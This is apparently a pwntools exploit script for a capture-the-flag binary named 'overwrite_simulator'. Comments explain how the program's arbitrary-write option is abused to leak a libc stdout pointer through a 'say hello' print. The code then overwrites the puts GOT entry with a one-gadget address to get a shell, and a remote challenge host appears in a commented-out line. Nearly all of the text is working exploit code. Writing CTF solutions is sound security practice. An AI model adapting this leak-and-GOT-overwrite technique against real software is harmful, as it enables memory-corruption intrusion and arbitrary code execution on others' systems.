#!/usr/bin/env python3
#This challenge was nice..It allows us to make arbitary write on any memory address we want
#But the point is we don't have a leak tho..
#The option say hello prints hello from the global array which we can use it to make a leak
#Because there is always stdin,stdout and stderr pointers near the global.
#If we make a write in the say hello string array 
#And remove the newline's there till the stdout pointer..
#Say hello option will print the contents along with the stdout pointer.
#And then we will overwrite the puts got entry to one gadget to get a shell.

from pwn import *


e = ELF("./overwrite_simulator_patched")
r = process("./overwrite_simulator_patched")
#r = remote("gc1.eng.run",31140)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")

def overwrite(address,value):
    r.sendlineafter(b">>",b"1")
    r.sendlineafter(b"Enter address to overwrite: ",f"{address}")
    r.sendlineafter(b"Enter data to be written: ",value)




address1  = 0x404074
overwrite(address1,b"A" * 8)
address2 = 0x404078
overwrite(address2,b"B" * 8)
r.sendlineafter(b">>",b"2")
r.recvuntil(b"BBBBBBBB")
libc_leak = u64(r.recvuntil(b"\x7f").decode('latin-1').ljust(8,'\x00'))
libc_base = libc_leak - libc.sym["IO_2_1_stdout"]
address3 = e.got["puts"]
overwrite(address3,p64(libc_base + 0xe6c81))
r.interactive()